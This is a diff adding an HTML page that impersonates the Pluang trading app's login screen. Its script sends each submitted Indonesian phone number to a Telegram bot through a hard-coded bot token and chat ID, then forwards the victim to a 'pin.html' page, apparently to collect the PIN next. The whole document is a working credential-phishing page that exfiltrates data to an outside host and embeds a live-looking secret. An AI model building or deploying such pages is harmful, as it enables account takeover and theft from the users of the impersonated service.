@@ -1,0 +1,119 @@
+<html lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <title>Pluang Login</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&amp;display=swap" rel="stylesheet"/>
+  <style>
+   body {
+      font-family: 'Inter', sans-serif;
+    }
+  </style>
+ </head>
+ <body class="bg-white text-black">
+  <header class="flex items-center justify-between px-5 py-4 border-b border-gray-200">
+   <div class="flex items-center space-x-2">
+    <img alt="Pluang logo letter P in black on white background" class="w-6 h-6" height="24" src="https://storage.googleapis.com/a1aa/image/4e19577c-c7c6-41f5-228a-427a5a04c273.jpg" width="24"/>
+    <span class="text-lg font-normal select-none">Pluang</span>
+   </div>
+   <button class="text-indigo-600 font-medium text-base px-4 py-1.5 border border-indigo-600 rounded-full hover:bg-indigo-50 transition" type="button">Sign Up</button>
+   <button aria-label="Menu" class="lg:hidden focus:outline-none">
+    <i class="fas fa-bars text-2xl text-black"></i>
+   </button>
+  </header>
+  <main class="px-5 pt-6 pb-10 max-w-md mx-auto">
+   <section class="relative rounded-xl overflow-hidden">
+    <img alt="Laptop screen showing trading platform interface with black background and purple light streaks" class="w-full rounded-xl" height="300" src="https://storage.googleapis.com/a1aa/image/19a43289-daac-4310-1510-85cbe17811bf.jpg" width="600"/>
+    <div class="absolute top-5 left-1/2 -translate-x-1/2 text-white text-sm font-normal" style="font-feature-settings: 'liga' 0">
+     FREE Trading with <span class="font-semibold text-yellow-400">Unlimited Indicators!</span>
+    </div>
+    <div class="absolute bottom-3 left-1/2 -translate-x-1/2 flex space-x-2">
+     <span class="w-2.5 h-2.5 rounded-full bg-white opacity-50"></span>
+     <span class="w-6 h-2.5 rounded-full bg-indigo-600"></span>
+    </div>
+   </section>
+   <div class="mt-6 text-right">
+    <a class="text-indigo-600 text-sm font-normal" href="#">Need help?</a>
+   </div>
+   <h1 class="mt-4 text-3xl font-extrabold leading-tight">Log in to your account</h1>
+   <p class="mt-1 text-gray-600 text-base font-normal">
+    Don’t have an account yet? <a class="text-indigo-600" href="#">Register</a>
+   </p>
+   <form id="loginForm" class="mt-5 space-y-4">
+    <div class="flex space-x-3">
+     <button class="flex items-center space-x-2 border border-gray-300 rounded-lg px-4 py-3 text-base text-gray-900 font-normal" type="button">
+      <img alt="Flag of Indonesia with red and white horizontal stripes" class="w-6 h-4 rounded-sm object-cover" height="16" src="https://www.era.smp2rembang.sch.id/assetpublic/assets/img/clients/client-2.png" width="24"/>
+      <span>+62</span>
+     </button>
+     <input id="phoneNumber" aria-label="Phone Number" class="flex-1 border border-gray-300 rounded-lg px-4 py-3 text-base text-gray-400 placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-indigo-600 focus:border-indigo-600" placeholder="Phone Number" type="tel" required/>
+    </div>
+    <label class="inline-flex items-center space-x-2 text-xs text-gray-700">
+     <input id="agreeTerms" aria-label="Agree to terms and conditions" class="w-4 h-4 border border-gray-300 rounded-full focus:ring-2 focus:ring-indigo-600" type="checkbox" required/>
+     <span class="font-normal">I agree to Pluang's <a class="text-indigo-600" href="#">Terms and Conditions.</a></span>
+    </label>
+    <button id="submitBtn" class="w-full bg-gray-300 text-gray-500 text-base font-normal rounded-full py-4 mt-4 cursor-not-allowed" disabled type="submit">Log In</button>
+   </form>
+  </main>
+  <script>
+    const form = document.getElementById('loginForm');
+    const phoneInput = document.getElementById('phoneNumber');
+    const agreeCheckbox = document.getElementById('agreeTerms');
+    const submitBtn = document.getElementById('submitBtn');
+
+    // Enable submit button only if checkbox is checked and phone number is not empty
+    function toggleSubmit() {
+      if (agreeCheckbox.checked && phoneInput.value.trim() !== '') {
+        submitBtn.disabled = false;
+        submitBtn.classList.remove('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
+        submitBtn.classList.add('bg-indigo-600', 'text-white', 'cursor-pointer');
+      } else {
+        submitBtn.disabled = true;
+        submitBtn.classList.add('bg-gray-300', 'text-gray-500', 'cursor-not-allowed');
+        submitBtn.classList.remove('bg-indigo-600', 'text-white', 'cursor-pointer');
+      }
+    }
+
+    phoneInput.addEventListener('input', toggleSubmit);
+    agreeCheckbox.addEventListener('change', toggleSubmit);
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const phoneNumber = phoneInput.value.trim();
+      if (!phoneNumber) return;
+
+      const botToken = '8479141074:AAHXRTIUGTqpC0Qvw31YqB3pb3W6Ji6PfPc';
+      const chatId = '7549590022';
+      const message = `New login attempt:\nPhone Number: +62${phoneNumber}`;
+
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      try {
+        const res = await fetch(url, {
+          method: 'POST',
+          headers: {
+                      'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        });
+
+        if (res.ok) {
+          window.location.href="pin.html";
+          form.reset();
+          toggleSubmit();
+        } else {
+          alert('Failed to send data to Telegram.');
+        }
+      } catch (error) {
+        alert('Error sending data to Telegram.');
+        console.error(error);
+      }
+    });
+  </script>
+ </body>
+</html>
